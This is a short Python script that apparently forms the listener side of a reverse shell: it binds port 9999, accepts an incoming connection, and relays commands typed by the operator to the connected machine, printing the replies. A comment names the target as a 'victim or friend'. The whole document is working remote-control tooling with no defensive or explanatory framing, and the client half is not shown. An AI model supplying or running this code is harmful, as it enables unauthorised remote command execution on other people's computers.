import socket
import sys

# create a socket (Connect two computers)
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error" +str(msg))

# binding the socket and listening for connnections

def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the port" + str(port))

        s.bind((host,port))
        s.listen(5)

    except socket.error as msg:
        print("Socket binding error" + str(msg) + "\n" + "Retrying.....")
        bind_socket()


#  Establish connection with client(socket must be listeing)

def socket_accept():
    conn,address =s.accept()
    print("Connection has been established!" + "IP" + address[0] + "| port" + str(address[1]))
    send_commands(conn)
    conn.close()
#     send commands to victim or friend
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="" )

def main():
    create_socket()
    bind_socket()
    socket_accept()

main()







